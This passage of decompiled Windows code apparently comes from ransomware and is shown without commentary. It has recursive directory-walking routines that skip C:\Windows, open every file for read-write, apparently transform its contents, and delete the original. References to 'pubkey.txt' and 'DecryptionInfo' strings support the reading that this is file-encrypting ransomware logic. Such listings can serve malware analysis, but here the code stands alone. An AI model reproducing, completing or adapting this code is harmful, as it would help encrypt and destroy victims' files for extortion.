    sub_46C87D(v69);
    v148 = 0i64;
    v149 = 0;
  }
  v151 = 2;
  if ( a7 >= 0x10 )
  {
    v71 = a7 + 1;
    v72 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v71 = a7 + 36;
      v72 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v72 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v106 = v71;
    sub_46C87D(v72);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v151) = 1;
  if ( a13 >= 8 )
  {
    v73 = 2 * a13 + 2;
    v74 = a8;
    if ( v73 >= 0x1000 )
    {
      v73 = 2 * a13 + 37;
      v74 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v74 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v106 = v73;
    sub_46C87D(v74);
  }
  a12 = 0;
  a13 = 7;
  LOWORD(a8) = 0;
  LOBYTE(v151) = 0;
  if ( a20 >= 8 )
  {
    v75 = 2 * a20 + 2;
    v76 = a15;
    if ( v75 >= 0x1000 )
    {
      v75 = 2 * a20 + 37;
      v76 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v76 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v106 = v75;
    sub_46C87D(v76);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  v151 = -1;
  if ( a26 >= 8 )
  {
    v77 = 2 * a26 + 2;
    v78 = a21;
    if ( v77 >= 0x1000 )
    {
      v77 = 2 * a26 + 37;
      v78 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v78 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v106 = v77;
    sub_46C87D(v78);
  }
  a25 = 0;
  a26 = 7;
  result = 0;
  LOWORD(a21) = 0;
  return result;
}
// 40B98D: variable 'v42' is possibly undefined
// 40BAE6: variable 'v51' is possibly undefined
// 40BAFD: variable 'v52' is possibly undefined
// 40BB12: variable 'v53' is possibly undefined
// 40BB55: variable 'v55' is possibly undefined
// 40BB68: variable 'v56' is possibly undefined
// 40BD4D: variable 'v63' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];
// 4CD17C: using guessed type wchar_t aPubkeyTxt[11];
// 4CD194: using guessed type wchar_t aIdoTxt[8];
// 4CD1A4: using guessed type wchar_t aDecryptionInfo[16];

//----- (0040C100) --------------------------------------------------------
int __usercall sub_40C100@<eax>(
        int a1@<edi>,
        _DWORD *a2,
        _BYTE *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        unsigned int a8,
        _BYTE *a9,
        int a10,
        int a11,
        int a12,
        int a13,
        unsigned int a14,
        int a15,
        _BYTE *a16,
        int a17,
        int a18,
        int a19,
        int a20,
        unsigned int a21,
        _BYTE *a22,
        int a23,
        int a24,
        int a25,
        int a26,
        unsigned int a27)
{
  int v27; // ebx
  const WCHAR *v28; // eax
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  char v41; // al
  LPCWSTR *v42; // ecx
  void *v43; // edx
  int v44; // ecx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  LPCWSTR *v49; // ecx
  void *v50; // edx
  char *v51; // eax
  int v52; // ecx
  int v53; // ecx
  int v54; // eax
  LPCWSTR *v55; // ecx
  void *v56; // edx
  const wchar_t *v57; // eax
  LPCWSTR *v58; // ecx
  void *v59; // edx
  int v60; // ecx
  HANDLE v61; // esi
  int v62; // edi
  int v63; // esi
  unsigned __int64 v64; // kr00_8
  LPCWSTR *v65; // ecx
  WCHAR *v66; // edx
  void *v67; // esi
  unsigned int v68; // ecx
  int v69; // edx
  _BYTE *v70; // ecx
  unsigned int v71; // edx
  _BYTE *v72; // ecx
  unsigned int v73; // edx
  _BYTE *v74; // ecx
  unsigned int v75; // edx
  _BYTE *v76; // ecx
  int result; // eax
  wchar_t *v78[5]; // [esp-78h] [ebp-43Ch] BYREF
  unsigned int v79; // [esp-64h] [ebp-428h] BYREF
  _BYTE *v80; // [esp-60h] [ebp-424h] BYREF
  int v81; // [esp-5Ch] [ebp-420h]
  int v82; // [esp-58h] [ebp-41Ch]
  int v83; // [esp-54h] [ebp-418h]
  int v84; // [esp-50h] [ebp-414h]
  unsigned int v85; // [esp-4Ch] [ebp-410h] BYREF
  _BYTE *v86; // [esp-48h] [ebp-40Ch] BYREF
  int v87; // [esp-44h] [ebp-408h]
  int v88; // [esp-40h] [ebp-404h]
  int v89; // [esp-3Ch] [ebp-400h]
  int v90; // [esp-38h] [ebp-3FCh]
  unsigned int v91; // [esp-34h] [ebp-3F8h]
  _BYTE *v92; // [esp-30h] [ebp-3F4h] BYREF
  int v93; // [esp-2Ch] [ebp-3F0h]
  int v94; // [esp-28h] [ebp-3ECh]
  int v95; // [esp-24h] [ebp-3E8h]
  int v96; // [esp-20h] [ebp-3E4h]
  unsigned int v97; // [esp-1Ch] [ebp-3E0h]
  _BYTE *v98; // [esp-18h] [ebp-3DCh] BYREF
  int v99; // [esp-14h] [ebp-3D8h]
  int v100; // [esp-10h] [ebp-3D4h]
  int v101; // [esp-Ch] [ebp-3D0h]
  int v102; // [esp-8h] [ebp-3CCh]
  LPCWSTR *v103; // [esp-4h] [ebp-3C8h]
  unsigned int v104; // [esp+0h] [ebp-3C4h] BYREF
  int v105[5]; // [esp+10h] [ebp-3B4h] BYREF
  unsigned int v106; // [esp+24h] [ebp-3A0h]
  int v107[5]; // [esp+28h] [ebp-39Ch] BYREF
  unsigned int v108; // [esp+3Ch] [ebp-388h]
  int v109[5]; // [esp+40h] [ebp-384h] BYREF
  unsigned int v110; // [esp+54h] [ebp-370h]
  int v111[5]; // [esp+58h] [ebp-36Ch] BYREF
  unsigned int v112; // [esp+6Ch] [ebp-358h]
  int v113[5]; // [esp+70h] [ebp-354h] BYREF
  unsigned int v114; // [esp+84h] [ebp-340h]
  int v115[5]; // [esp+88h] [ebp-33Ch] BYREF
  unsigned int v116; // [esp+9Ch] [ebp-328h]
  _BYTE **v117; // [esp+A0h] [ebp-324h]
  int v118[4]; // [esp+B4h] [ebp-310h] BYREF
  int v119; // [esp+C4h] [ebp-300h]
  unsigned int v120; // [esp+C8h] [ebp-2FCh]
  unsigned int *v121; // [esp+CCh] [ebp-2F8h]
  HANDLE hFindFile; // [esp+D0h] [ebp-2F4h]
  unsigned int *v123; // [esp+D4h] [ebp-2F0h]
  __int64 v124; // [esp+D8h] [ebp-2ECh]
  wchar_t **v125; // [esp+E0h] [ebp-2E4h]
  _BYTE **v126; // [esp+E4h] [ebp-2E0h]
  _DWORD *v127; // [esp+E8h] [ebp-2DCh]
  unsigned int v128; // [esp+ECh] [ebp-2D8h]
  int v129; // [esp+F0h] [ebp-2D4h]
  char v130; // [esp+F7h] [ebp-2CDh]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+F8h] [ebp-2CCh] BYREF
  int v132[5]; // [esp+348h] [ebp-7Ch] BYREF
  unsigned int v133; // [esp+35Ch] [ebp-68h]
  LPCWSTR *v134; // [esp+360h] [ebp-64h]
  LPCWSTR *v135; // [esp+364h] [ebp-60h]
  LPCWSTR *v136; // [esp+368h] [ebp-5Ch]
  LPCWSTR *v137; // [esp+36Ch] [ebp-58h]
  LPCWSTR *v138; // [esp+370h] [ebp-54h]
  LPCWSTR *v139; // [esp+374h] [ebp-50h]
  LPCWSTR *v140; // [esp+378h] [ebp-4Ch]
  LPCWSTR *v141; // [esp+37Ch] [ebp-48h]
  LPCWSTR *v142; // [esp+380h] [ebp-44h]
  unsigned int v143; // [esp+384h] [ebp-40h]
  int v144; // [esp+388h] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+38Ch] [ebp-38h] BYREF
  unsigned int v146; // [esp+3A0h] [ebp-24h]
  unsigned __int64 v147; // [esp+3A4h] [ebp-20h] BYREF
  int v148; // [esp+3ACh] [ebp-18h]
  int *v149; // [esp+3B4h] [ebp-10h]
  int v150; // [esp+3C0h] [ebp-4h]
  int savedregs; // [esp+3C4h] [ebp+0h] BYREF

  v149 = (int *)&v104;
  v127 = a2;
  v128 = a15;
  v27 = 0;
  v129 = 0;
  v150 = 5;
  v147 = 0i64;
  v148 = 0;
  sub_4229A0((int)lpFileName, a2, L"\\*");
  LOBYTE(v150) = 6;
  v28 = (const WCHAR *)lpFileName;
  if ( v146 >= 8 )
    v28 = lpFileName[0];
  hFindFile = FindFirstFileW(v28, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  do
  {
    v29 = sub_4194E0((int)v111, FindFileData.cFileName);
    LOBYTE(v150) = 7;
    v30 = (char *)sub_4229A0((int)v113, v127, (unsigned __int16 *)"\\");
    LOBYTE(v150) = 8;
    v31 = sub_421BF0((int)v115, v30, v29);
    LOBYTE(v150) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v150) = 8;
    if ( v116 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v116 + 2);
      v142 = v32;
      v33 = (void *)v115[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v116 + 37);
        v142 = v32;
        v33 = *(void **)(v115[0] - 4);
        if ( (unsigned int)(v115[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v103 = v32;
      sub_46C87D(v33);
    }
    v115[4] = 0;
    v116 = 7;
    LOWORD(v115[0]) = 0;
    LOBYTE(v150) = 7;
    if ( v114 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v114 + 2);
      v141 = v34;
      v35 = (void *)v113[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v114 + 37);
        v141 = v34;
        v35 = *(void **)(v113[0] - 4);
        if ( (unsigned int)(v113[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v103 = v34;
      sub_46C87D(v35);
    }
    v113[4] = 0;
    v114 = 7;
    LOWORD(v113[0]) = 0;
    LOBYTE(v150) = 6;
    if ( v112 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v112 + 2);
      v140 = v36;
      v37 = (void *)v111[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v112 + 37);
        v140 = v36;
        v37 = *(void **)(v111[0] - 4);
        if ( (unsigned int)(v111[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v103 = v36;
      sub_46C87D(v37);
    }
    v111[4] = 0;
    v112 = 7;
    LOWORD(v111[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v60) == -1 )
      {
        v103 = lpFileName;
        if ( v148 == HIDWORD(v147) )
        {
          sub_423CD0((int *)&v147, SHIDWORD(v147), v103);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v147), v103);
          HIDWORD(v147) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v150) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v146 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( v39 )
      {
        fclose(v39);
        v40 = (WCHAR *)sub_421E60((int)v109, (unsigned int *)lpFileName, (int)v103);
        LOBYTE(v150) = 11;
        v41 = sub_404BC0(v40);
        v130 = v41;
        LOBYTE(v150) = 10;
        if ( v110 >= 8 )
        {
          v42 = (LPCWSTR *)(2 * v110 + 2);
          v139 = v42;
          v43 = (void *)v109[0];
          if ( (unsigned int)v42 >= 0x1000 )
          {
            v42 = (LPCWSTR *)(2 * v110 + 37);
            v139 = v42;
            v43 = *(void **)(v109[0] - 4);
            if ( (unsigned int)(v109[0] - (_DWORD)v43 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v103 = v42;
          sub_46C87D(v43);
          v41 = v130;
        }
        v109[4] = 0;
        v110 = 7;
        v44 = 0;
        LOWORD(v109[0]) = 0;
        if ( v41 )
        {
          v45 = (WCHAR *)sub_421E60((int)v107, (unsigned int *)lpFileName, 0);
          LOBYTE(v150) = 13;
          v124 = sub_404B60(v45);
          LOBYTE(v150) = 10;
          v44 = v108;
          if ( v108 >= 8 )
          {
            v46 = (LPCWSTR *)(2 * v108 + 2);
            v138 = v46;
            v47 = (void *)v107[0];
            if ( (unsigned int)v46 >= 0x1000 )
            {
              v46 = (LPCWSTR *)(2 * v108 + 37);
              v138 = v46;
              v47 = *(void **)(v107[0] - 4);
              if ( (unsigned int)(v107[0] - (_DWORD)v47 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            v103 = v46;
            sub_46C87D(v47);
          }
          v107[4] = 0;
          v108 = 7;
          LOWORD(v107[0]) = 0;
        }
        v48 = (_DWORD *)sub_421E60((int)v105, (unsigned int *)lpFileName, v44);
        LOBYTE(v150) = 15;
        sub_404120(v48, (int)v132);
        LOBYTE(v150) = 17;
        if ( v106 >= 8 )
        {
          v49 = (LPCWSTR *)(2 * v106 + 2);
          v137 = v49;
          v50 = (void *)v105[0];
          if ( (unsigned int)v49 >= 0x1000 )
          {
            v49 = (LPCWSTR *)(2 * v106 + 37);
            v137 = v49;
            v50 = *(void **)(v105[0] - 4);
            if ( (unsigned int)(v105[0] - (_DWORD)v50 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v103 = v49;
          sub_46C87D(v50);
        }
        v105[4] = 0;
        v106 = 7;
        LOWORD(v105[0]) = 0;
        if ( (unsigned __int64)(v124 - 150301) > 0x248C3 )
          goto LABEL_42;
        sub_421E60((int)v118, (unsigned int *)&a22, v124 - 150301);
        LOBYTE(v150) = 19;
        v27 |= 1u;
        v129 = v27;
        v51 = (char *)v118;
        if ( v120 >= 8 )
          v51 = (char *)v118[0];
        if ( !sub_403F60(v132, v51, v119)
          || sub_4191C0((char *)lpFileName, L"C:\\Windows", v52) != -1
          || (v54 = sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v53), v130 = 1, v54 != -1) )
        {
LABEL_42:
          v130 = 0;
        }
        v150 = 17;
        if ( (v27 & 1) != 0 )
        {
          v27 &= ~1u;
          v129 = v27;
          LOBYTE(v150) = 17;
          if ( v120 >= 8 )
          {
            v55 = (LPCWSTR *)(2 * v120 + 2);
            v136 = v55;
            v56 = (void *)v118[0];
            if ( (unsigned int)v55 >= 0x1000 )
            {
              v55 = (LPCWSTR *)(2 * v120 + 37);
              v136 = v55;
              v56 = *(void **)(v118[0] - 4);
              if ( (unsigned int)(v118[0] - (_DWORD)v56 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            v103 = v55;
            sub_46C87D(v56);
          }
          v119 = 0;
          v120 = 7;
          LOWORD(v118[0]) = 0;
        }
        if ( v130 )
        {
          v117 = &v98;
          sub_419530(&v98, &a22);
          LOBYTE(v150) = 21;
          v123 = (unsigned int *)&v92;
          sub_419530(&v92, &a9);
          LOBYTE(v150) = 22;
          v121 = (unsigned int *)&v86;
          sub_419530(&v86, &a16);
          LOBYTE(v150) = 23;
          v126 = &v80;
          sub_419BE0(&v80, &a3);
          LOBYTE(v150) = 24;
          v125 = v78;
          sub_419530(v78, lpFileName);
          LOBYTE(v150) = 17;
          sub_409110(
            v128,
            (int)&savedregs,
            a1,
            v29,
            v78[0],
            (int)v78[1],
            (int)v78[2],
            (int)v78[3],
            (int)v78[4],
            v79,
            v80,
            v81,
            v82,
            v83,
            v84,
            v85,
            v86,
            v87,
            v88,
            v89,
            v90,
            v91,
            v92,
            v93,
            v94,
            v95,
            v96,
            v97,
            v98,
            v99,
            v100,
            v101,
            v102,
            (unsigned int)v103);
          v57 = (const wchar_t *)lpFileName;
          if ( v146 >= 8 )
            v57 = lpFileName[0];
          _wremove(v57);
        }
        LOBYTE(v150) = 10;
        if ( v133 >= 8 )
        {
          v58 = (LPCWSTR *)(2 * v133 + 2);
          v135 = v58;
          v59 = (void *)v132[0];
          if ( (unsigned int)v58 >= 0x1000 )
          {
            v58 = (LPCWSTR *)(2 * v133 + 37);
            v135 = v58;
            v59 = *(void **)(v132[0] - 4);
            if ( (unsigned int)(v132[0] - (_DWORD)v59 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v103 = v58;
          sub_46C87D(v59);
        }
        v132[4] = 0;
        v133 = 7;
        LOWORD(v132[0]) = 0;
        v150 = 6;
      }
      else
      {
        LOBYTE(v150) = 6;
      }
    }
    v61 = hFindFile;
  }
  while ( FindNextFileW(hFindFile, &FindFileData) );
  FindClose(v61);
  v64 = v147;
  v62 = HIDWORD(v64);
  v63 = v64;
  v144 = v147;
  while ( v63 != v62 )
  {
    v125 = (wchar_t **)&v98;
    sub_419530(&v98, &a22);
    LOBYTE(v150) = 28;
    v126 = &v92;
    sub_419530(&v92, &a16);
    LOBYTE(v150) = 29;
    v91 = v128;
    v121 = &v85;
    sub_419530(&v85, &a9);
    LOBYTE(v150) = 30;
    v123 = &v79;
    sub_419BE0(&v79, &a3);
    LOBYTE(v150) = 6;
    sub_40C100(
      v63,
      v79,
      v80,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102,
      v103);
    v63 += 24;
    v144 = v63;
  }
  LOBYTE(v150) = 5;
  if ( v146 >= 8 )
  {
    v65 = (LPCWSTR *)(2 * v146 + 2);
    v134 = v65;
    v66 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v65 >= 0x1000 )
    {
      v65 = (LPCWSTR *)(2 * v146 + 37);
      v134 = v65;
      v66 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v66 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = v65;
    sub_46C87D(v66);
  }
  lpFileName[4] = 0;
  v146 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v150) = 4;
  if ( (_DWORD)v147 )
  {
    v103 = (LPCWSTR *)v147;
    sub_425130(v147, SHIDWORD(v147));
    v67 = (void *)v147;
    v68 = 24 * ((v148 - (int)v147) / 24);
    v143 = v68;
    if ( v68 >= 0x1000 )
    {
      v68 += 35;
      v143 = v68;
      v67 = *(void **)(v147 - 4);
      if ( (unsigned int)(v147 - (_DWORD)v67 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v103 = (LPCWSTR *)v68;
    sub_46C87D(v67);
    v147 = 0i64;
    v148 = 0;
  }
  v150 = 2;
  if ( a8 >= 0x10 )
  {
    v69 = a8 + 1;
    v70 = a3;
    if ( a8 + 1 >= 0x1000 )
    {
      v69 = a8 + 36;
      v70 = (_BYTE *)*((_DWORD *)a3 - 1);
      if ( (unsigned int)(a3 - v70 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v69;
    sub_46C87D(v70);
  }
  a7 = 0;
  a8 = 15;
  LOBYTE(a3) = 0;
  LOBYTE(v150) = 1;
  if ( a14 >= 8 )
  {
    v71 = 2 * a14 + 2;
    v72 = a9;
    if ( v71 >= 0x1000 )
    {
      v71 = 2 * a14 + 37;
      v72 = (_BYTE *)*((_DWORD *)a9 - 1);
      if ( (unsigned int)(a9 - v72 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v71;
    sub_46C87D(v72);
  }
  a13 = 0;
  a14 = 7;
  LOWORD(a9) = 0;
  LOBYTE(v150) = 0;
  if ( a21 >= 8 )
  {
    v73 = 2 * a21 + 2;
    v74 = a16;
    if ( v73 >= 0x1000 )
    {
      v73 = 2 * a21 + 37;
      v74 = (_BYTE *)*((_DWORD *)a16 - 1);
      if ( (unsigned int)(a16 - v74 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v73;
    sub_46C87D(v74);
  }
  a20 = 0;
  a21 = 7;
  LOWORD(a16) = 0;
  v150 = -1;
  if ( a27 >= 8 )
  {
    v75 = 2 * a27 + 2;
    v76 = a22;
    if ( v75 >= 0x1000 )
    {
      v75 = 2 * a27 + 37;
      v76 = (_BYTE *)*((_DWORD *)a22 - 1);
      if ( (unsigned int)(a22 - v76 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v104 = v75;
    sub_46C87D(v76);
  }
  a26 = 0;
  a27 = 7;
  result = 0;
  LOWORD(a22) = 0;
  return result;
}
// 40C4B9: variable 'v44' is possibly undefined
// 40C5A9: variable 'v52' is possibly undefined
// 40C5BC: variable 'v53' is possibly undefined
// 40C811: variable 'v60' is possibly undefined
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD168: using guessed type wchar_t asc_4CD168[3];

//----- (0040CBC0) --------------------------------------------------------
int __cdecl sub_40CBC0(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // edi
  const WCHAR *v27; // eax
  HANDLE v28; // ebx
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  bool v41; // bl
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  LPCWSTR *v49; // ecx
  void *v50; // edx
  char *v51; // eax
  int v52; // ecx
  int v53; // ecx
  char v54; // bl
  LPCWSTR *v55; // ecx
  void *v56; // edx
  const wchar_t *v57; // eax
  LPCWSTR *v58; // ecx
  void *v59; // edx
  int v60; // ecx
  int v61; // edi
  int v62; // esi
  unsigned __int64 v63; // kr00_8
  LPCWSTR *v64; // ecx
  WCHAR *v65; // edx
  void *v66; // esi
  unsigned int v67; // ecx
  int v68; // edx
  _BYTE *v69; // ecx
  unsigned int v70; // edx
  _BYTE *v71; // ecx
  unsigned int v72; // edx
  _BYTE *v73; // ecx
  unsigned int v74; // edx
  _BYTE *v75; // ecx
  int result; // eax
  wchar_t *v77[5]; // [esp-78h] [ebp-430h] BYREF
  unsigned int v78; // [esp-64h] [ebp-41Ch] BYREF
  _BYTE *v79; // [esp-60h] [ebp-418h] BYREF
  int v80; // [esp-5Ch] [ebp-414h]
  int v81; // [esp-58h] [ebp-410h]
  int v82; // [esp-54h] [ebp-40Ch]
  int v83; // [esp-50h] [ebp-408h]
  unsigned int v84; // [esp-4Ch] [ebp-404h] BYREF
  _BYTE *v85; // [esp-48h] [ebp-400h] BYREF
  int v86; // [esp-44h] [ebp-3FCh]
  int v87; // [esp-40h] [ebp-3F8h]
  int v88; // [esp-3Ch] [ebp-3F4h]
  int v89; // [esp-38h] [ebp-3F0h]
  unsigned int v90; // [esp-34h] [ebp-3ECh]
  _BYTE *v91; // [esp-30h] [ebp-3E8h] BYREF
  int v92; // [esp-2Ch] [ebp-3E4h]
  int v93; // [esp-28h] [ebp-3E0h]
  int v94; // [esp-24h] [ebp-3DCh]
  int v95; // [esp-20h] [ebp-3D8h]
  unsigned int v96; // [esp-1Ch] [ebp-3D4h]
  _BYTE *v97; // [esp-18h] [ebp-3D0h] BYREF
  int v98; // [esp-14h] [ebp-3CCh]
  int v99; // [esp-10h] [ebp-3C8h]
  int v100; // [esp-Ch] [ebp-3C4h]
  int v101; // [esp-8h] [ebp-3C0h]
  LPCWSTR *v102; // [esp-4h] [ebp-3BCh]
  unsigned int v103; // [esp+0h] [ebp-3B8h] BYREF
  int v104[5]; // [esp+10h] [ebp-3A8h] BYREF
  unsigned int v105; // [esp+24h] [ebp-394h]
  int v106[5]; // [esp+28h] [ebp-390h] BYREF
  unsigned int v107; // [esp+3Ch] [ebp-37Ch]
  int v108[5]; // [esp+40h] [ebp-378h] BYREF
  unsigned int v109; // [esp+54h] [ebp-364h]
  int v110[5]; // [esp+58h] [ebp-360h] BYREF
  unsigned int v111; // [esp+6Ch] [ebp-34Ch]
  int v112[5]; // [esp+70h] [ebp-348h] BYREF
  unsigned int v113; // [esp+84h] [ebp-334h]
  int v114[5]; // [esp+88h] [ebp-330h] BYREF
  unsigned int v115; // [esp+9Ch] [ebp-31Ch]
  _BYTE **v116; // [esp+A0h] [ebp-318h]
  int v117[4]; // [esp+ACh] [ebp-30Ch] BYREF
  int v118; // [esp+BCh] [ebp-2FCh]
  unsigned int v119; // [esp+C0h] [ebp-2F8h]
  unsigned int *v120; // [esp+C4h] [ebp-2F4h]
  unsigned int *v121; // [esp+C8h] [ebp-2F0h]
  __int64 v122; // [esp+CCh] [ebp-2ECh]
  wchar_t **v123; // [esp+D4h] [ebp-2E4h]
  _BYTE **v124; // [esp+D8h] [ebp-2E0h]
  _DWORD *v125; // [esp+DCh] [ebp-2DCh]
  unsigned int v126; // [esp+E0h] [ebp-2D8h]
  int v127; // [esp+E4h] [ebp-2D4h]
  HANDLE hFindFile; // [esp+E8h] [ebp-2D0h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+ECh] [ebp-2CCh] BYREF
  int v130[5]; // [esp+33Ch] [ebp-7Ch] BYREF
  unsigned int v131; // [esp+350h] [ebp-68h]
  unsigned int v132; // [esp+354h] [ebp-64h]
  LPCWSTR *v133; // [esp+358h] [ebp-60h]
  LPCWSTR *v134; // [esp+35Ch] [ebp-5Ch]
  LPCWSTR *v135; // [esp+360h] [ebp-58h]
  LPCWSTR *v136; // [esp+364h] [ebp-54h]
  LPCWSTR *v137; // [esp+368h] [ebp-50h]
  LPCWSTR *v138; // [esp+36Ch] [ebp-4Ch]
  LPCWSTR *v139; // [esp+370h] [ebp-48h]
  LPCWSTR *v140; // [esp+374h] [ebp-44h]
  LPCWSTR *v141; // [esp+378h] [ebp-40h]
  int v142; // [esp+37Ch] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+380h] [ebp-38h] BYREF
  unsigned int v144; // [esp+394h] [ebp-24h]
  unsigned __int64 v145; // [esp+398h] [ebp-20h] BYREF
  int v146; // [esp+3A0h] [ebp-18h]
  int *v147; // [esp+3A8h] [ebp-10h]
  int v148; // [esp+3B4h] [ebp-4h]
  int savedregs; // [esp+3B8h] [ebp+0h] BYREF

  v147 = (int *)&v103;
  v125 = a1;
  v126 = a14;
  v26 = 0;
  v127 = 0;
  v148 = 5;
  v145 = 0i64;
  v146 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v148) = 6;
  v27 = (const WCHAR *)lpFileName;
  if ( v144 >= 8 )
    v27 = lpFileName[0];
  hFindFile = FindFirstFileW(v27, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  v28 = hFindFile;
  do
  {
    v29 = sub_4194E0((int)v110, FindFileData.cFileName);
    LOBYTE(v148) = 7;
    v30 = (char *)sub_4229A0((int)v112, v125, (unsigned __int16 *)"\\");
    LOBYTE(v148) = 8;
    v31 = sub_421BF0((int)v114, v30, v29);
    LOBYTE(v148) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v148) = 8;
    if ( v115 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v115 + 2);
      v141 = v32;
      v33 = (void *)v114[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v115 + 37);
        v141 = v32;
        v33 = *(void **)(v114[0] - 4);
        if ( (unsigned int)(v114[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v32;
      sub_46C87D(v33);
    }
    v114[4] = 0;
    v115 = 7;
    LOWORD(v114[0]) = 0;
    LOBYTE(v148) = 7;
    if ( v113 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v113 + 2);
      v140 = v34;
      v35 = (void *)v112[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v113 + 37);
        v140 = v34;
        v35 = *(void **)(v112[0] - 4);
        if ( (unsigned int)(v112[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v102 = v34;
      sub_46C87D(v35);
    }
    v112[4] = 0;
    v113 = 7;
    LOWORD(v112[0]) = 0;
    LOBYTE(v148) = 6;
    if ( v111 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v111 + 2);
      v139 = v36;
      v37 = (void *)v110[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v111 + 37);
        v139 = v36;
        v37 = *(void **)(v110[0] - 4);
